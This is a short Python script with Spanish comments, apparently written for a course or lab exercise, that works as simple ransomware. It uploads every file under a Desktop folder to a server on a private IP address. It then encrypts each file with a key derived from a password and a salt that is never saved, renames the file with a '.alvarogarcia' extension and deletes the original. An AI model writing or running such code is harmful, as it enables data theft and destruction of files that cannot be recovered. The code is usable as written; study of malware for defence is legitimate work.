import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import requests

# URL del servidor donde se subirán los archivos
upload_url = 'http://192.168.1.155:5000/upload'

# Función para subir archivos
def upload_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(upload_url, files={'file': f})
        return response.status_code == 200
    except Exception as e:
        return False

# Directorio base de donde se subirán los archivos
base_dir = os.path.expanduser(r'~\Desktop\keepcoding')

# Iterar sobre los archivos en el directorio base
for root, dirs, files in os.walk(base_dir):
    for file in files:
        file_path = os.path.join(root, file)
        upload_file(file_path)

base_dir = os.path.expanduser(r'~\Desktop\keepcoding')

# Generar una clave secreta válida
salt = os.urandom(16)
key = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
).derive(b'keepcoding')

# Convertir la clave secreta a un string de base64 seguro
key_base64 = base64.urlsafe_b64encode(key)

# Crear un objeto Fernet con la clave secreta
cipher_suite = Fernet(key_base64)

# Iterar sobre los archivos en el directorio de trabajo
for root, dirs, files in os.walk(base_dir):
    for file in files:
        # Abrir el archivo en modo binario
        with open(os.path.join(root, file), 'rb') as f:
            # Leer el contenido del archivo
            data = f.read()

        # Encriptar el contenido del archivo
        encrypted_data = cipher_suite.encrypt(data)

        # Agregar la extensión ".alvarogarcia" al nombre del archivo
        new_file_name = file + '.alvarogarcia'

        # Guardar el archivo encriptado con la nueva extensión
        with open(os.path.join(root, new_file_name), 'wb') as f:
            f.write(encrypted_data)

        # Eliminar el archivo original
        os.remove(os.path.join(root, file))
